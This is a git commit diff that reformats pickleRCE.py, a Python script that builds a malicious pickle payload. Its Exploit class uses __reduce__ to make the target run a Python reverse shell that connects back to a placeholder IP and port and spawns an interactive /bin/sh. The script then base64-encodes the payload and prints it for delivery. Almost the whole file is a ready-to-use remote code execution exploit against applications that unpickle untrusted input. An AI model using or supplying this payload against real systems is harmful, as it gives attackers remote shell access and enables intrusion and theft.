82ab4705b7db059e1b7ce05fc46594ca1b2fe87c
Enciphers <32484011+enciphers@users.noreply.github.com>
2020-01-19 16:15:12 +0530

    Update pickleRCE.py

--- pickleRCE.py
+++ pickleRCE.py
@@ -1,9 +1,11 @@
 import subprocess
 import pickle
 import base64
+
 # Exploit that we want the target to unpickle
 class Exploit(object):
-        def __reduce__(self):
-                return (subprocess.Popen, (('python', '-c', 'import socket,subprocess   ,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR$
+    def __reduce__(self):
+        return (subprocess.Popen, (('python', '-c', 'import socket,subprocess	,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS", IP_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'),))
+
 shellcode =base64.b64encode(pickle.dumps(Exploit()))
 print(shellcode)
